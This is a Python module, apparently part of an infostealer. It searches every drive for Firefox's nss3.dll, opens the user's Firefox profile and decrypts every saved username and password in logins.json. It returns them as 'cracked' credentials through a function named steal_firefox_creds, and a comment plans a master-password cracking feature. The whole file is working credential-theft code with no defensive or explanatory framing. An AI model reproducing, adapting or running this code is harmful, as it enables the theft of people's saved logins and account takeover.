import os
from base64 import b64decode
import ctypes
import string
from classes.firefox import MyException, SECItem, PK11SlotInfo
import json


__FIREFOX_PROFILES_ROOT = os.path.normpath(r"%s\AppData\Roaming\Mozilla\Firefox\Profiles"%(os.environ['USERPROFILE']))
__FIREFOX_KEY4DB_FILE = "key4.db" # will be used in the future
__FIREFOX_LOGINSJSON_FILE = "logins.json"
__NSS3_DLL = "nss3.dll"


def __find_file(name, path):
    for root, dirs, files in os.walk(path):
        if name in files:
            return root, os.path.join(root, name)
    return None


def __get_host_drives():
    return ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]


def __search_nss3_dll_libarary_path():
    host_drives = __get_host_drives()

    for drive in host_drives:
        _, nss3_dll_path = __find_file(__NSS3_DLL, drive)

        if nss3_dll_path:
            return nss3_dll_path


def __load_nss3_dll_libarary():
    nss3_dll_libarary_path = __search_nss3_dll_libarary_path()
    if nss3_dll_libarary_path:
        return ctypes.CDLL(nss3_dll_libarary_path)
    raise MyException("nss3.dll was not found in the firefox installation folder")


def __set_nss3_attr_and_res(nss3):
    SlotInfoPtr = ctypes.POINTER(PK11SlotInfo)
    SECItemPtr = ctypes.POINTER(SECItem)

    self = getattr(nss3, "PK11_GetInternalKeySlot")
    self.restype = SlotInfoPtr

    self = getattr(nss3, "PK11SDR_Decrypt")
    self.argtypes = [SECItemPtr, SECItemPtr, ctypes.c_void_p]

    self = getattr(nss3, "PK11_NeedLogin")
    self.argtypes = [SlotInfoPtr]


def __nss3_init(nss3):
    loginsjson_root_path, _ = __find_file(__FIREFOX_LOGINSJSON_FILE, __FIREFOX_PROFILES_ROOT)
    nss3.NSS_Init((r"sql:%s"%(loginsjson_root_path)).encode("utf-8"))


def __get_logins_from_loginsjson_file():
    _, loginsjson_file_path = __find_file(__FIREFOX_LOGINSJSON_FILE, __FIREFOX_PROFILES_ROOT)
    logins = []

    with open(loginsjson_file_path, "r") as f:
        data = json.load(f)
        for record in data['logins']:
            logins.append({
                "hostname": record["hostname"],
                "encryptedUsername": record["encryptedUsername"],
                "encryptedPassword": record["encryptedPassword"]
            })

    return logins


def __generate_nss3_key_slot(nss3):
    key_slot = nss3.PK11_GetInternalKeySlot()

    if key_slot:
        return key_slot


def __PK11SDR_Decrypt(nss3, encrypted_data):
    data = b64decode(encrypted_data)
    input = SECItem(0, data, len(data))
    output = SECItem(0, None, 0)
    _ = nss3.PK11SDR_Decrypt(input, output, None)
    return output.decode_data()


def __decrypt_firefox_creds(nss3, logins):
    key_slot = __generate_nss3_key_slot(nss3)

    if key_slot:
        need_login = nss3.PK11_NeedLogin(key_slot)

        if not need_login: # firefox master key detection
            cracked_logins = []

            for login in logins:
                cracked_username = __PK11SDR_Decrypt(nss3, login["encryptedUsername"])
                cracked_password = __PK11SDR_Decrypt(nss3, login["encryptedPassword"])
                cracked_logins.append({
                    "hostname": login["hostname"],
                    "cracked_username": cracked_username,
                    "cracked_password": cracked_password
                })

            return cracked_logins
        else:
            raise MyException("Master password detected, need to implement crack feature") # TODO: create a master password crack feature
    else:
        raise MyException("Couldn't create nss3 keyslot")


def steal_firefox_creds(): # get firefox credentials
    nss3 = __load_nss3_dll_libarary()
    __nss3_init(nss3)
    __set_nss3_attr_and_res(nss3)
    logins = __get_logins_from_loginsjson_file()
    return __decrypt_firefox_creds(nss3, logins)
